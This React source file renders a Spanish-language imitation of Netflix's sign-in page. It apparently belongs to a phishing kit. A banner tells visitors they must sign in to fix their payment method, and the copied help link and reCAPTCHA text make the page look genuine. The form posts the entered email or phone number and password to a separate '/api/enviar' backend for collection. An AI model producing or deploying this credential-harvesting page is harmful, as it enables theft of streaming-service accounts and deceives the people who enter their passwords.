import React, { useState } from "react";
import styles from './login.module.css';


export default function Login({ onLoginSuccess }) {
    const [emailOrPhone, setEmailOrPhone] = useState("");
    const [password, setPassword] = useState("");
    const [errorMessage, setErrorMessage] = useState("");
    const [showRecaptchaInfo, setShowRecaptchaInfo] = useState(false);

    const validateInput = async (e) => {
        e.preventDefault();

        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const phoneRegex = /^\+\d{1,3}\d{7,14}$/;

        if (emailRegex.test(emailOrPhone) || phoneRegex.test(emailOrPhone)) {
            setErrorMessage("");

            const data = {
                name: emailOrPhone,
                password,  // Corregido el error tipográfico
            };
            try {
                const response = await fetch('http://localhost:5000/api/enviar', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                });

                const result = await response.json();
                if (response.status === 201) {
                    onLoginSuccess();
                } else {
                    setErrorMessage(result.message);
                }
            } catch (error) {
                setErrorMessage("Hubo un error al enviar los datos.");
            }
        } else {
            setErrorMessage("Ingrese un correo válido o un número de teléfono con formato internacional.");
        }
    };

    const handleRecaptchaClick = () => {
        setShowRecaptchaInfo(!showRecaptchaInfo);
    };

    return (
        <div className={styles.conteinerTotal}>
            <div className={styles.PCELMDPDIS}>
                <p>Para corregir el método de pago debe iniciar sesión</p>
            </div>
            <div className={styles.conteinerLogin}>
                <div className={styles.divH2}>
                    <h2>Inicia sesión</h2>
                </div>
                <form onSubmit={validateInput} className={styles.conteinerLoginForm}>
                    <input
                        type="text"
                        placeholder="Email o número de celular"
                        value={emailOrPhone}
                        required
                        onChange={(e) => setEmailOrPhone(e.target.value)}
                    />
                    {errorMessage && (
                        <p className={styles.errorMessage}>{errorMessage}</p>
                    )}
                    <input
                        type="password"
                        placeholder="Contraseña"
                        value={password}
                        required
                        onChange={(e) => setPassword(e.target.value)}
                    />
                    <button type="submit">Iniciar sesión</button>
                    <div className={styles.centrado}>
                        <div className={styles.conteinerRecuerdame}>
                            <input type="checkbox" id="Recuerdame" />
                            <p>Recuérdame</p>
                        </div>
                        <a href="https://www.netflix.com/LoginHelp" className={styles.olvidaste}>
                            ¿Olvidaste la contraseña?
                        </a>
                    </div>
                </form>
                <div className={styles.text}>
                    <button type="button" onClick={handleRecaptchaClick}>
                        Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot.
                    </button>
                    {showRecaptchaInfo && (
                        <p className={styles.recaptchaInfo}>
                            La información recopilada por Google reCAPTCHA está sujeta a la{' '}
                            <a href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer">
                                Política de privacidad
                            </a>{' '}
                            y a las{' '}
                            <a href="https://policies.google.com/terms" target="_blank" rel="noopener noreferrer">
                                Condiciones del servicio
                            </a>{' '}
                            de Google, y se utiliza para proporcionar, mantener y mejorar el servicio de reCAPTCHA, así
                            como para fines generales de seguridad (Google no la utiliza para personalizar publicidad).
                        </p>
                    )}
                </div>
            </div>
        </div>
    );
}
